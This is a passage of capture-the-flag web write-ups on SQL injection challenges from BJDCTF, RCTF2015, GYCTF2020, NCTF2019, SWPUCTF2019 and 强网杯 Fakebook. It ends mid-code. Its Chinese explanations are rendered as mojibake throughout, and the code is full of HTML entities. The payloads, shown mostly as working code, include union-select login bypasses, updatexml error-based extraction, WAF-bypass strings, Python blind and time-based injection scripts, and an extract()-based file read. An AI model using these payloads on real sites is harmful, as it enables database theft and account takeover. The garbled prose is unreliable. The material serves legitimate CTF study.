å…ˆè¯´è¯´base32 å’Œ base64 çš„åŒºåˆ«ï¼Œ base32 åªæœ‰å¤§å†™å­—æ¯å’Œæ•°å­—æ•°å­—ç»„æˆï¼Œæˆ–è€…åé¢æœ‰ä¸‰ä¸ªç­‰å·ã€‚ base64 åªæœ‰å¤§å†™å­—æ¯å’Œæ•°å­—ï¼Œå°å†™å­—æ¯ç»„æˆï¼Œåé¢ä¸€èˆ¬æ˜¯ä¸¤ä¸ªç­‰å·ã€‚ æ˜æ˜¾ï¼Œé‚£æ®µæ–‡å­—æ˜¯base32åŠ å¯† è§£å¯†åï¼šc2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw== ç»§ç»­base64è§£å¯†ï¼šselect * from user where username = '$name' 12345name&#x3D;1&#39; or 1&#x3D;1#&amp;pw&#x3D;1 &#x2F;&#x2F; wrong user! &gt;&gt;&gt; do not hack me! &#x2F;&#x2F; orå’Œ&#x3D;è¢«è¿‡æ»¤äº†name&#x3D;1&#39; Or 1#&amp;pw&#x3D;1 &#x2F;&#x2F; å¤§å°å†™ç›´æ¥ç»•è¿‡äº†name&#x3D;1&#39; Or 1 Order by 4#&amp;pw&#x3D;1&gt;&gt;&gt; Error: Unknown column &#39;4&#39; in &#39;order clause&#39; &#x2F;&#x2F;å¯ä»¥çŸ¥é“æœ‰ä¸‰ä¸ªcolumn ç›²çŒœå­—æ®µåä¸ºidã€usernameã€passwordï¼Œå½“usernameä¸ºadminæ—¶ä¼šè¯´wrong pass!ï¼Œå…¶ä»–éƒ½æ˜¯wrong user!ï¼Œusernameåº”è¯¥å°±æ˜¯adminäº†ã€‚ é‚£ä¹ˆé€»è¾‘å°±æ˜¯ï¼šå…ˆåˆ¤æ–­usernameåœ¨ä¸åœ¨æ•°æ®åº“,å†åˆ¤æ–­å¯†ç å¯¹ä¸å¯¹ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è”åˆæŸ¥è¯¢çš„æ—¶å€™ä¼šåˆ›ä¸€ä¸ªè™šæ‹Ÿçš„è¡¨å•ï¼Œè®©ä»–æŸ¥è¿™ä¸ªè™šæ‹Ÿè¡¨ã€‚ ä¸‹é¢çŒœæµ‹adminåœ¨å“ªä¸ªå­—æ®µï¼š 1name&#x3D;1&#39;union select 1,&#39;admin&#39;,3# æˆ‘ä»¬çŸ¥é“æœ‰adminç”¨æˆ·çš„ï¼Œç»æµ‹è¯•name=1'union select 1,'admin',3#æŠ¥å¯†ç é”™è¯¯ï¼Œè¯´æ˜è¿™é‡Œå°±æ˜¯usernameäº†ï¼Œpasswordå­—æ®µåº”è¯¥æ˜¯3çš„ä½ç½®ã€‚ è¿™é“é¢˜å¾—çŒœå®ƒçš„åç«¯æºç æ˜¯æ€ä¹ˆå†™çš„ï¼š 123456789101112&lt;?php$name = $_POST[&#x27;name&#x27;];$passwd = md5($_POST[&#x27;pw&#x27;]);$sql = &quot;select * from user where username = &#x27;$name&#x27;&quot;;$query = mysql_query($sql);if (!strcasecmp($passwd, $query[passwd])) &#123; echo $flag;&#125; else &#123; echo(&quot;Wrong Pass&quot;);&#125; ç”±äºnameå‚æ•°å¯æ³¨ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ sqlè¯­å¥ä½¿å…¶æŸ¥è¯¢ä¸ºå‡ï¼Œç„¶åè”åˆæŸ¥è¯¢å‡ºä¸€ä¸ªæ¯”å¦‚0f5ed8a8d8d44d86a570aacffa922251(ca01hçš„md5)ï¼Œç„¶åå¯†ç è¾“å…¥ca01hï¼Œå°±ä¼šæŸ¥è¯¢æˆåŠŸã€‚ 12username &#x3D; 1&#39; union select 1,&#39;admin&#39;,&#39;0f5ed8a8d8d44d86a570aacffa922251&#39;#password &#x3D; ca01h å‚è€ƒï¼šhttps://www.gem-love.com/ctf/453.html RCTF2015 EasySQL è€ƒç‚¹ æŠ¥é”™æ³¨å…¥ äºŒæ¬¡æ³¨å…¥ è§£é¢˜ ä¸»è¦æœ‰ä¸‰ä¸ªåŠŸèƒ½ï¼Œæ³¨å†Œã€ç™»å½•å’Œä¿®æ”¹å¯†ç ï¼Œè¿™ç§æƒ…å†µä¸€èˆ¬éƒ½æ˜¯äºŒæ¬¡æ³¨å…¥çš„é—®é¢˜ã€‚ åœ¨æ³¨å†Œé¡µé¢ï¼Œè¯•äº†ä¸€ä¸‹ï¼Œusername å’Œ email å¤„æœ‰è¿‡æ»¤ï¼Œç›´æ¥ fuzz ä¸€ä¸‹å“ªäº›å­—ç¬¦è¢«ç¦äº† æ³¨å†Œç”¨æˆ·åzzz\\ï¼Œåœ¨ç‚¹å‡»ä¿®æ”¹å¯†ç åï¼Œæœ‰ä¸€ä¸ªæŠ¥é”™ï¼š çŒœæµ‹SQLè¯­å¥åº”è¯¥æ˜¯è¿™æ ·å†™çš„ï¼š 1select * from user where username &#x3D; &quot;zzz\\&quot; and pwd &#x3D; &#39;92dd83acc13018d34e2454d4c5c05cf3&#39; ä½¿ç”¨æŠ¥é”™æ³¨å…¥çš„æ–¹å¼çˆ†å‡ºæ•°æ® è·å–å½“å‰ç”¨æˆ·ä¿¡æ¯ 1zzz&quot;||(updatexml(1,concat(0x7e,(select(user())),0x7e),1))# è¿”å›XPATH syntax error: '~root@localhost~' æŸ¥çœ‹å½“å‰æ•°æ®åº“ 1zzz&quot;||(updatexml(1,concat(0x7e,(select(database())),0x7e),1))# è¿”å›XPATH syntax error: '~web_sqli~' æŸ¥çœ‹æ•°æ®åº“çš„è¡¨ 1zzz&quot;||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())),0x7e),1))# è¿”å›XPATH syntax error: '~article,flag,users~' æŸ¥çœ‹usersè¡¨ä¸­çš„å­—æ®µ 1zzz&quot;||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;users&#39;)),0x7e),1))# è¿”å›XPATH syntax error: '~name,pwd,email,real_flag_1s_her' ä½¿ç”¨reverseå‡½æ•°æŸ¥çœ‹åé¢çš„å†…å®¹ 1zzz&quot;||(updatexml(1,concat(0x7e,reverse((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;users&#39;))),0x7e),1))# è¿”å›XPATH syntax error: '~ereh_s1_galf_laer,liame,dwp,ema' æŸ¥çœ‹real_flag_1s_hereå­—æ®µçš„å†…å®¹ 1zzz&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)),0x7e),1))# è¿”å›XPATH syntax error: '~xxx,xxx,xxx,xxx,xxx,xxx,xxx,xxx' çœ‹åˆ°æœ‰å¾ˆå¤šåƒåœ¾æ•°æ®ï¼Œç”¨regexpåŒ¹é…få¼€å¤´ 1zzz&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)),0x7e),1))# è¿”å›XPATH syntax error: '~flag&#123;e43ad246-f211-4292-a531-c3' å†ç”¨reverseå‡½æ•°è¯»åé¢çš„å†…å®¹ 1zzz&quot;||(updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),0x7e),1))# è¿”å›XPATH syntax error: '~&#125;04c7d828343c-135a-2924-112f-64' GYCTF2020 Ezsqli è€ƒç‚¹ æ— information_schemaå¸ƒå°”ç›²æ³¨ æ— åˆ—åæ³¨å…¥ è§£é¢˜ è¿‡æ»¤å¾ˆå¤šä¸œè¥¿ï¼Œæ¯”å¦‚information_schemaã€unionâ€¦selectã€joinã€ifã€andã€orç­‰ç­‰ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯è€ƒè™‘ç›²æ³¨äº†ã€‚ å¦å¤–è¿˜å‘ç°ï¼š 122è¿”å›V&amp;N 122||1&#x3D;1è¿”å›Nu1l 122||1&#x3D;5è¿”å›V&amp;N ä¹Ÿå°±æ˜¯è¯´ï¼Œæœ¬æ¥2æŸ¥è¯¢çš„æ˜¯V&amp;Nï¼Œå¦‚æœ||åé¢çš„è¡¨è¾¾å¼ä¸ºTrueåˆ™è¿”å›Nu1Lã€falseåˆ™è¿”å›V&amp;Nã€‚ åˆ¤æ–­ä¸€ä¸‹æ˜¯ä¸æ˜¯ç›²æ³¨ 122||length(database())&gt;0è¿”å›Nu1l 122||length(database())&lt;0è¿”å›V&amp;N ç¡®å®šæ˜¯ç›²æ³¨äº†ï¼Œé‚£ä¹ˆå°±ç›´æ¥å†™è„šæœ¬ç”¨äºŒåˆ†æ³•ç›²æ³¨è¡¨åï¼Œå¯ä»¥ä½¿ç”¨sys.schema_table_statistics_with_buffer innodb_table_statså’Œinnodb_index_statså’Œsys.schema_table_statisticsä¹Ÿå¯ä»¥ä½¿ç”¨ 1234567891011121314151617181920212223242526272829import requestsfrom time import sleepURL = &quot;http://acbcc15b-d8f2-48b3-9c67-3b16b465068f.node3.buuoj.cn/index.php&quot;flag = &quot;Nu1L&quot;result = &quot;&quot;target = &quot;select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()&quot;for i in range(1, 50): sleep(0.1) low = 32 high = 127 while high &gt; low: mid = (high + low) &gt;&gt; 1 payload = &quot;2||ascii(substr((&#123;&#125;),&#123;&#125;,1))&gt;&#123;&#125;&quot; data = &#123; &#x27;id&#x27;: payload.format(target, i, mid) &#125; response = requests.post(url=URL, data=data) if flag in response.text: low = mid + 1 else: high = mid if low != 32: result += chr(low) else: break print(result) å¾—åˆ°è¡¨å 1users23333333333333,f1ag_1s_h3r3_hhhhh ä¸‹é¢å°±è¦å®ç°æ— åˆ—åæ³¨å…¥ åœ¨çŸ¥é“è¡¨åï¼Œä¸çŸ¥é“åˆ—åçš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨unionæ¥ç»™æœªçŸ¥åˆ—åâ€œé‡å‘½åâ€ï¼Œè¿˜å¯ä»¥åˆ©ç”¨æŠ¥é”™å‡½æ•°æ¥æ³¨å…¥å‡ºåˆ—åã€‚ è¿™é“é¢˜å†æå‡ºä¸€ç§æ€è·¯ï¼Œasciiä½åç§»å¤§å°æ¯”è¾ƒã€‚åå­—å¬èµ·æ¥æ¯”è¾ƒç„ä¹ï¼Œä½†æ˜¯åŸç†å¾ˆç®€å•ï¼š æ ¸å¿ƒpayloadï¼š(select 'admin','admin')&gt;(select * from users limit 1) å‡è®¾flagä¸ºflag{bbbbb}ï¼Œå¯¹äºpayloadè¿™ä¸ªä¸¤ä¸ªselectæŸ¥è¯¢çš„æ¯”è¾ƒï¼Œæ˜¯æŒ‰ä½æ¯”è¾ƒçš„ï¼Œå³å…ˆæ¯”ç¬¬ä¸€ä½ï¼Œå¦‚æœç›¸ç­‰åˆ™æ¯”ç¬¬äºŒä½ï¼Œä»¥æ­¤ç±»æ¨ï¼›åœ¨æŸä¸€ä½ä¸Šï¼Œå¦‚æœå‰è€…çš„ASCIIå¤§ï¼Œä¸ç®¡æ€»é•¿åº¦å¦‚ä½•ï¼ŒASCIIå¤§çš„åˆ™å¤§ï¼Œè¿™ä¸ªä¸éš¾æ‡‚ï¼Œå’Œcè¯­è¨€çš„strcmp()å‡½æ•°åŸç†ä¸€æ ·ï¼Œä¸¾å‡ ä¸ªä¾‹å­ï¼š glag &gt; flag{bbbbb} alag{zzzzzzzzzzz} &lt; flag{bbbbb} a &lt; flag{bbbbb} z &gt; flag{bbbbb} åœ¨è¿™æ ·çš„æŒ‰ä½æ¯”è¾ƒè¿‡ç¨‹ä¸­ï¼Œå› ä¸ºåœ¨é‡Œå±‚çš„for()å¾ªç¯ï¼Œå­—å…¸é¡ºåºæ˜¯ä»ASCIIç å°åˆ°å¤§æ¥æšä¸¾å¹¶æ¯”è¾ƒçš„ï¼Œå‡è®¾æ­£ç¡®å€¼ä¸ºbï¼Œé‚£ä¹ˆå­—å…¸è·‘åˆ°bçš„æ—¶å€™b=bä¸æ»¡è¶³payloadçš„å¤§äºå·ï¼Œåªèƒ½ç»§ç»­ä¸‹ä¸€è½®å¾ªç¯ï¼Œc&gt;bæ­¤æ—¶æ»¡è¶³äº†ï¼Œé¢˜ç›®è¿”å›çœŸï¼Œå‡ºç°äº†Nu1Lå…³é”®å­—ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦è®°å½•flagçš„å€¼äº†ï¼Œä½†æ˜¯æ­¤æ—¶è¿™ä¸€ä½çš„charæ˜¯cï¼Œè€ŒçœŸæ­£çš„flagçš„è¿™ä¸€ä½åº”è¯¥æ˜¯bæ‰å¯¹ï¼Œæ‰€ä»¥flag += chr(char-1)ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆåœ¨å­˜flagæ—¶å€™è¦å¾€å‰åç§»ä¸€ä½çš„åŸå› ã€‚ å¦å¤–è¿˜éœ€è¦æ³¨æ„çš„åœ°æ–¹æ˜¯ï¼Œå­—æ®µæ•°ä¸€å®šæ˜¯ä¸€ä¸€åŒ¹é…ï¼Œè¿™é‡Œf1ag_1s_h3r3_hhhhhæ˜¯æœ‰ä¸¤ä¸ªå­—æ®µçš„(å¯ä»¥ç”¨select 1|select 1,2|select 1,2,3è¯•ä¸€è¯•)ï¼ŒçŸ¥é“æ˜¯ä¸¤ä¸ªå­—æ®µåï¼Œè¿˜è¦æ³¨æ„å­—æ®µå†…çš„ä¸€ä¸€å¯¹åº”ï¼Œf1ag_1s_h3r3_hhhhhè¡¨ä¸­çš„flagåœ¨ç¬¬äºŒä¸ªå­—æ®µã€‚ ç›´æ¥show codeï¼š 1234567891011121314151617181920import requestsfrom time import sleepURL = &quot;http://98ef5288-1d34-4680-a03c-1aa5f5fbfaad.node3.buuoj.cn/index.php&quot;flag = &quot;Nu1L&quot;result = &quot;&quot;payload = &quot;2||(select 1,&#x27;&#123;&#125;&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh)&quot;for i in range(1,200): for j in range(32, 127): sleep(0.1) char = result + chr(j) data=&#123; &#x27;id&#x27;: payload.format(char) &#125; response = requests.post(URL, data=data) if flag in response.text: result += chr(j - 1) print(result) break; è¿™æ ·å°±å¯ä»¥æˆåŠŸçš„æ‹¿åˆ°flagã€‚ GXYCTF2019 BabysqliV3 NCTF2019 SQLi è€ƒç‚¹ regexç›²æ³¨ å‚è€ƒæ–‡ç« ï¼šREGEXPæ³¨å…¥ä¸LIKEæ³¨å…¥ è§£é¢˜ hint.txt 123456$black_list &#x3D; &quot;&#x2F;limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\\&#39;|&#x3D;| |in|&lt;|&gt;|-|\\.|\\(\\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep&#x2F;i&quot;;If $_POST[&#39;passwd&#39;] &#x3D;&#x3D;&#x3D; admin&#39;s password,Then you will get the flag; æ‰¾åˆ°adminçš„å¯†ç å³å¯å¾—flag ç”±äºå•å¼•å·è¢«ç¦ç”¨ï¼Œä½¿ç”¨ \\ è½¬ä¹‰andå‰é¢çš„é‚£ä¸ªå•å¼•å·ï¼Œä½¿å¾— '\\' and passwd=' å½¢æˆé—­åˆã€‚æ„é€ passwdå¤„ä¸º ||/**/passwd/**/regexp/**/&quot;^a&quot;;%00ï¼Œç”¨regexpæŸ¥è¯¢passwd ^åŒ¹é…å­—ç¬¦ä¸²å¼€å¤´ %00æˆªæ–­åé¢çš„å†…å®¹ã€‚ä½†æ˜¯ä¸èƒ½åœ¨è¾“å…¥æ¡†ç›´æ¥æäº¤ï¼Œä¼šè¢«url encode å˜ä¸º%2500è¢«é»‘åå•æ‹¦æˆªã€‚ æŸ¥è¯¢è¯­å¥å˜ä¸ºï¼š 1select * from users where username&#x3D;&#39;\\&#39; and passwd&#x3D;&#39;||&#x2F;**&#x2F;passwd&#x2F;**&#x2F;regexp&#x2F;**&#x2F;&quot;^a&quot;; å¦‚æœregexä¸ºçœŸçš„è¯ï¼Œä¼šè¿”å›404ï¼Œå¦åˆ™è·³è½¬è‡³ç™»å½•ç•Œé¢ã€‚ ç›²æ³¨è„šæœ¬ï¼š 123456789101112131415161718192021222324# -*- coding: UTF-8 -*-import requestsimport stringimport timefrom urllib import parseurl = &#x27;&#x27;&#x27;http://aabb7aa1-f68f-44c7-9e75-514410c6d6f2.node3.buuoj.cn/index.php&#x27;&#x27;&#x27;passwd = &quot;&quot;strs = string.ascii_lowercase + string.digits + &#x27;_&#x27;for i in range(100): for m in strs: time.sleep(0.3) data = &#123; &quot;username&quot;: &#x27;\\\\&#x27;, &quot;passwd&quot;: &#x27;||/**/passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;&#123;&#125;&#x27;.format(passwd+m, parse.unquote(&#x27;%00&#x27;)) &#125; res = requests.post(url, data) if res.status_code == 404: passwd += m print(passwd) breakprint(passwd) SWPUCTF2019 web1 è€ƒç‚¹ åå…­è¿›åˆ¶+MySQLé¢„ç¼–è¯‘ç»•è¿‡ PHPä»£ç å®¡è®¡ è§£é¢˜ é¢˜ç›®åªæœ‰ä¸€ä¸ªç™»å½•æ¡†ï¼Œæ³¨å†ŒåŠŸèƒ½æœªå¼€æ”¾ï¼Œéšæ„å¡«å†™å†…å®¹ï¼Œç‚¹å‡»ç™»å½•ï¼ŒæŠ“åŒ… åœ¨usernameå­—æ®µæ·»åŠ ä¸€ä¸ªå•å¼•å·PHPä¼šæŠ¥é”™ è€Œé—­åˆå¼•å·åä¼šæ­£å¸¸æ˜¾ç¤ºã€‚å› æ­¤å¯å¤§è‡´ç¡®å®šæ³¨å…¥å­˜åœ¨ï¼Œéšåå¼€å§‹æ„é€ payloadã€‚ç”±äºé¢˜ç›®å¯¹usernameè¿›è¡Œäº†ä¸¥æ ¼çš„æ£€æµ‹ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨å•è¯­å¥è¿›è¡Œæ³¨å…¥ï¼Œä½†æ˜¯æ³¨å…¥ç‚¹åˆå­˜åœ¨ï¼Œäºæ˜¯å¯ä»¥å°è¯•è¿›è¡Œå †å æ³¨å…¥ã€‚ ä¸è¿‡è²Œä¼¼è¿‡æ»¤äº†ç»å¤§å¤šæ•°çš„å…³é”®å­—ï¼Œé‡‡ç”¨16è¿›åˆ¶+MySQLé¢„å¤„ç†ç»•è¿‡ã€‚åŸç†å¦‚ä¸‹ï¼š ç¼–å†™æ—¶é—´ç›²æ³¨è„šæœ¬ï¼š 1234567891011121314151617181920212223242526272829303132import requestsimport jsonimport timedef main(): url = &#x27;&#x27;&#x27;http://71c8375e-74ff-45aa-a2ee-8670864f6b0b.node3.buuoj.cn/index.php?r=Login/Login&#x27;&#x27;&#x27; payloads = &quot;asd&#x27;;set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -&quot; flag = &#x27;&#x27; for i in range(1, 30): # payload = &quot;select if(ascii(substr((select database()),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot; # payload = &quot;select if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctf&#x27;),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot; # payload = &quot;select if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot; payload = &quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot; for j in range(0, 128): time.sleep(0.1) datas = &#123;&#x27;username&#x27;: payloads.format(str_to_hex(payload.format(i, j))), &#x27;password&#x27;: &#x27;test213&#x27;&#125; data = json.dumps(datas) times = time.time() res = requests.post(url=url, data=data) if time.time() - times &gt;= 3: flag = flag + chr(j) print(flag) breakdef str_to_hex(s): return &#x27;&#x27;.join([hex(ord(c)).replace(&#x27;0x&#x27;, &#x27;&#x27;) for c in s])if __name__ == &#x27;__main__&#x27;: main() æœ€åè·‘å‡ºäº†ä¸€ä¸ªæºä»£ç ï¼Œè¿›è¡Œå®¡è®¡ã€‚ æ—¢ç„¶æ˜¯MVCæ¶æ„ï¼Œå…ˆå¼„æ¸…æ¥šè·¯ç”± 12345678910111213141516171819202122232425262728if(!empty($_REQUEST[&#x27;r&#x27;]))&#123; $r = explode(&#x27;/&#x27;, $_REQUEST[&#x27;r&#x27;]); list($controller,$action) = $r; $controller = &quot;&#123;$controller&#125;Controller&quot;; $action = &quot;action&#123;$action&#125;&quot;; if(class_exists($controller)) &#123; if(method_exists($controller,$action)) &#123; // &#125; else &#123; $action = &quot;actionIndex&quot;; &#125; &#125; else &#123; $controller = &quot;LoginController&quot;; $action = &quot;actionIndex&quot;; &#125; $data = call_user_func(array( (new $controller), $action));&#125; else &#123; header(&quot;Location:index.php?r=Login/Index&quot;);&#125; ä»rå‚æ•°ä¸­è·å–è¦è®¿é—®çš„Controllerä»¥åŠAction,ç„¶åä»¥/åˆ†éš”å¼€åæ‹¼æ¥æˆå®Œæ•´çš„æ§åˆ¶å™¨åã€‚ä»¥Login/Indexä¸ºä¾‹ï¼Œå°±æ˜¯å°†Login/Indexåˆ†éš”å¼€åˆ†åˆ«æ‹¼æ¥æˆLoginControllerä»¥åŠactionIndex,ç„¶åè°ƒç”¨LoginControllerè¿™ä¸ªç±»ä¸­çš„actionIndexæ–¹æ³•ã€‚æ¯ä¸ªactioné‡Œé¢ä¼šè°ƒç”¨å¯¹åº”çš„loadView()æ–¹æ³•è¿›è¡Œæ¨¡ç‰ˆæ¸²æŸ“ï¼Œç„¶åå°†é¡µé¢è¿”å›ç»™å®¢æˆ·ç«¯ã€‚è‹¥è®¿é—®çš„Controllerä¸å­˜åœ¨åˆ™é»˜è®¤è§£æLogin/Indexã€‚ ä¸‹é¢çœ‹å…³é”®ä»£ç ï¼š 123456789public function loadView($viewName =&#x27;&#x27;, $viewData = [])&#123; $this-&gt;viewPath = BASE_PATH . &quot;/View/&#123;$viewName&#125;.php&quot;; if(file_exists($this-&gt;viewPath)) &#123; extract($viewData); include $this-&gt;viewPath; &#125;&#125; å¾ˆæ˜æ˜¾å¯ä»¥é€šè¿‡extractæ¥è¦†ç›–å˜é‡ï¼Œä¸è¿‡ç°åœ¨è¿˜ä¸çŸ¥é“éœ€è¦è¦†ç›–ä»€ä¹ˆå˜é‡ï¼Œå¯»æ‰¾å‡ ä¸ªè°ƒç”¨loadViewçš„æ–¹æ³•ï¼Œå‘ç°ä¸€ä¸ªå¯¹$viewDataå®Œå…¨å¯æ§çš„åœ°æ–¹ã€‚ 12345public function actionIndex()&#123; $listData = $_REQUEST; $this-&gt;loadView(&#x27;userIndex&#x27;,$listData);&#125; $listDataæ˜¯ä»REQUESTæå–å‡ºæ¥çš„ï¼Œå®Œå…¨å¯æ§ã€‚è€Œå…¶å¯¹åº”çš„/View/userIndex.phpä¸­å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶è¯»å–ã€‚ 123456 if(!isset($img_file)) &#123; $img_file = &#x27;/../favicon.ico&#x27;; &#125;$img_dir = dirname(__FILE__) . $img_file;$img_base64 = imgToBase64($img_dir);echo &#x27;&lt;img src=&quot;&#x27; . $img_base64 . &#x27;&quot;&gt;&#x27;; è¿™æ ·ï¼Œ$img_fileå¯é€šè¿‡extract($viewData)å˜é‡è¦†ç›–æ¼æ´å®Œå…¨æ§åˆ¶ï¼Œè€Œ$viewDataæ˜¯å—ç”¨æˆ·æ§åˆ¶çš„å®Œå…¨æ§åˆ¶çš„ã€‚æ‰€ä»¥è¿™é‡Œå°±å­˜åœ¨ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ã€‚ æ‰€ä»¥è®¿é—®?r=User/Index&amp;img_file=/../flag.phpå¯ç›´æ¥è·å–flag.phpç»base64åçš„å†…å®¹ã€‚ å¼ºç½‘æ¯2019 Fakebook è€ƒç‚¹ æºç æ³„éœ² SQLæ³¨å…¥ PHPååºåˆ—åŒ– SSRF é¢˜è§£ æœ‰robots.txt 12User-agent: *Disallow: &#x2F;user.php.bak è®¿é—®ä¸€ä¸‹æ‹¿åˆ°æºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpclass UserInfo&#123; public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) &#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; &#125; function get($url) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); &#125;&#125;?&gt; ç¬¬ä¸€çœ¼çœ‹ä¸Šå»å°±å¾ˆåƒæ˜¯SSRFæ¼æ´åˆ©ç”¨ï¼Œä½†æ˜¯å§‹ç»ˆç»•ä¸è¿‡isValidBlogå‡½æ•°ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼ èµ°ä¸€ä¸‹ç½‘ç«™çš„æµç¨‹ æ³¨å†Œäº†è´¦å· è®¿é—®ä¸ªäººç•Œé¢æ—¶ 1http:&#x2F;&#x2F;111.198.29.45:53095&#x2F;view.php?no&#x3D;1 è¾“å…¥no=9 æœ‰æŠ¥é”™ä¿¡æ¯ï¼Œæ³„éœ²äº†ç›®å½• 1Notice: Trying to get property of non-object in &#x2F;var&#x2F;www&#x2F;html&#x2F;view.php on line 53 çœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰sqlæ³¨å…¥ï¼Œæ‰‹å·¥æ³¨å¤±è´¥äº†ï¼Œæœ‰wafã€‚ çœ‹äº†ä¸€ä¸‹å¸ˆå‚…ä»¬çš„wp,å‘ç°æ˜¯wafæŠŠunion selectç»™è¿‡æ»¤äº†ï¼Œç”¨/**/å†…è”æ³¨é‡Šæ¥ç»•è¿‡ã€‚ 123456#çˆ†è¡¨no&#x3D;-1+union&#x2F;**&#x2F;select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema&#x3D;database() #çˆ†åˆ—no&#x3D;-1+union&#x2F;**&#x2F;select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema&#x3D;database()#çˆ†åˆ—dataçš„å†…å®¹no&#x3D;-1+union&#x2F;**&#x2F;select 1,group_concat(data),3,4 from users dataé‡Œçš„å†…å®¹å°±æ˜¯æˆ‘ä»¬ä¹‹å‰æ³¨å†Œç”¨æˆ·çš„åºåˆ—åŒ–æ•°æ®ï¼ŒæŠ¥é”™ä¿¡æ¯æš—ç¤ºæˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ªåºåˆ—åŒ–å¯¹è±¡ 1unserialize(): Error at offset 0 of 1 bytes in &lt;b&gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;view.php&lt;&#x2F;b&gt; on line 31 è¿™é‡Œæäº¤äº†ä¸€ä¸ªnoçš„å‚æ•°ï¼Œè¿”å›äº†ç”¨æˆ·ä¿¡æ¯è¿™ä¸ªé¡µé¢ï¼Œæ‰€ä»¥ä¸éš¾çŒœåˆ°æœåŠ¡å™¨ç«¯æ˜¯é€šè¿‡åˆ†ænoå‚æ•°ï¼Œå†ä»æ•°æ®åº“ä¸­è¿›è¡ŒæŸ¥è¯¢ï¼Œç„¶åè¿”å›æˆ‘ä»¬çš„ä¿¡æ¯ï¼Œä¹‹å‰sqlæ³¨å…¥æ—¶å¾—åˆ°äº†æœåŠ¡å™¨å†æŸ¥è¯¢æ—¶æ˜¯æŸ¥è¯¢äº†4ä¸ªå­—æ®µï¼Œè€Œæˆ‘ä»¬å¾—åˆ°çš„å¯ç”¨çš„å­—æ®µæœ‰[no,username,passwd,data]å››ä¸ªå­—æ®µã€‚ æ¯‹åº¸ç½®ç–‘çš„æ˜¯æˆ‘ä»¬çš„æ³¨å†Œä¿¡æ¯æ˜¯å†™å…¥äº†æ•°æ®åº“çš„ï¼Œè€Œno,username,passwdä¸‰ä¸ªå­—æ®µå‡æ²¡æœ‰æˆ‘ä»¬æ³¨å†Œæ—¶å€™å¡«å†™çš„blogåœ°å€ï¼Œåªæœ‰dataå­—æ®µä¸­æœ‰ä¸€ä¸ªåºåˆ—åŒ–åçš„blogå±æ€§çš„å€¼ã€‚é‚£ä¹ˆè¿”å›çš„é¡µé¢ä¸­çš„bolgåœ°å€æ˜¯æ€ä¹ˆæŸ¥è¯¢çš„? æˆ–è€…è¯´æ€ä¹ˆå¾—åˆ°çš„ï¼Ÿå°±æ˜¯é€šè¿‡æŸ¥è¯¢dataå­—æ®µ,å¾—åˆ°å…¶ä¸­çš„åºåˆ—åŒ–ä¿¡æ¯æ¥æ¸²æŸ“æ•´ä¸ªé¡µé¢ï¼Œä»è€Œæ°å¥½å¾—åˆ°é¡µé¢ä¸­çš„username,age,blogå€¼ã€‚ çŒœæƒ³åˆ°è¿™ä¸ªé€»è¾‘ä¹‹å,æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¿®æ”¹æŸ¥è¯¢çš„åºåˆ—åŒ–å¯¹è±¡çš„å€¼æ¥æ„é€ ssrfè¯·æ±‚,ä»è€Œè¯»å–åˆ°flagæ–‡ä»¶ åˆ©ç”¨å‰é¢æ³„éœ²çš„æºç æ„é€ ä¸€ä¸ªæ¶æ„å¯¹è±¡ 12345678910&lt;?phpclass UserInfo &#123; public $name = &quot;admin&quot;; 